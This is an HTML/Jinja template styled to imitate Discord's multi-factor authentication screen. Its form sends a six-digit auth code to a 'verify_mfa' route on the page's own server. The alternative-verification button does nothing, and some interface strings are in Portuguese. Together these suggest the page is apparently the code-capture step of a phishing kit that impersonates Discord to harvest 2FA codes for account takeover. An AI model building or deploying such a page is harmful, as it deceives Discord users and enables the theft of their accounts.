<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Multi-Factor Authentication</title>
    <style>
        body {
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Background animation */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }

        .mfa-container {
            background-color: #2f3136;
            border-radius: 8px;
            padding: 32px;
            width: 480px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.24);
            position: relative;
            z-index: 1;
        }

        .close-button {
            position: absolute;
            top: 16px;
            right: 16px;
            background: none;
            border: none;
            color: #b9bbbe;
            font-size: 24px;
            cursor: pointer;
            padding: 4px;
            border-radius: 4px;
            transition: color 0.2s ease;
        }

        .close-button:hover {
            color: #ffffff;
        }

        .mfa-title {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
            color: #ffffff;
        }

        .mfa-subtitle {
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
            color: #b9bbbe;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .mfa-input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #40444b;
            border-radius: 3px;
            background-color: #40444b;
            color: #dcddde;
            font-size: 16px;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            box-sizing: border-box;
            transition: border-color 0.2s ease;
        }

        .mfa-input:focus {
            outline: none;
            border-color: #7289da;
        }

        .mfa-input::placeholder {
            color: #72767d;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }

        .verify-else-button {
            background: none;
            border: 2px dashed #f04747;
            color: #f04747;
            padding: 8px 16px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s ease;
        }

        .verify-else-button:hover {
            background-color: rgba(240, 71, 71, 0.1);
        }

        .confirm-button {
            background-color: #5865f2;
            border: none;
            color: #ffffff;
            padding: 12px 24px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: background-color 0.2s ease;
        }

        .confirm-button:hover {
            background-color: #4752c4;
        }

        .confirm-button:disabled {
            background-color: #4f545c;
            cursor: not-allowed;
        }

        .error-message {
            color: #f04747;
            background-color: rgba(240, 71, 71, 0.1);
            border: 1px solid #f04747;
            border-radius: 4px;
            padding: 10px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 14px;
        }

        .loading {
            display: none;
            text-align: center;
            color: #7289da;
            margin-top: 10px;
            font-size: 14px;
        }

        /* Input focus animation */
        .mfa-input:focus {
            animation: inputFocus 0.2s ease;
        }

        @keyframes inputFocus {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="mfa-container">
        <button class="close-button" onclick="window.history.back()">×</button>
        
        <h1 class="mfa-title">Multi-Factor Authentication</h1>
        <p class="mfa-subtitle">Enter Discord Auth Code</p>
        
        {% if error %}
        <div class="error-message">
            {{ error }}
        </div>
        {% endif %}
        
        <form action="{{ url_for('verify_mfa') }}" method="post" id="mfaForm">
            <div class="form-group">
                <input 
                    type="text" 
                    id="mfa_code" 
                    name="mfa_code" 
                    class="mfa-input"
                    placeholder="6-digit authentication code"
                    maxlength="6"
                    pattern="[0-9]{6}"
                    required
                    autocomplete="one-time-code"
                >
            </div>
            
            <div class="button-container">
                <button type="button" class="verify-else-button">
                    Verify with something else
                </button>
                <button type="submit" class="confirm-button" id="confirmBtn">
                    Confirm
                </button>
            </div>
            
            <div class="loading" id="loading">
                Verificando código 2FA...
            </div>
        </form>
    </div>

    <script>
        // Auto-format input to only accept numbers
        document.getElementById('mfa_code').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            
            // Enable/disable confirm button based on input length
            const confirmBtn = document.getElementById('confirmBtn');
            if (this.value.length === 6) {
                confirmBtn.disabled = false;
            } else {
                confirmBtn.disabled = true;
            }
        });

        // Handle form submission
        document.getElementById('mfaForm').addEventListener('submit', function(e) {
            const mfaCode = document.getElementById('mfa_code').value;
            if (mfaCode.length !== 6) {
                e.preventDefault();
                return;
            }
            
            document.getElementById('confirmBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
        });

        // Auto-focus on input
        document.getElementById('mfa_code').focus();

        // Handle "Verify with something else" button
        document.querySelector('.verify-else-button').addEventListener('click', function() {
            alert('Esta funcionalidade não está disponível nesta versão.');
        });
    </script>
</body>
</html>
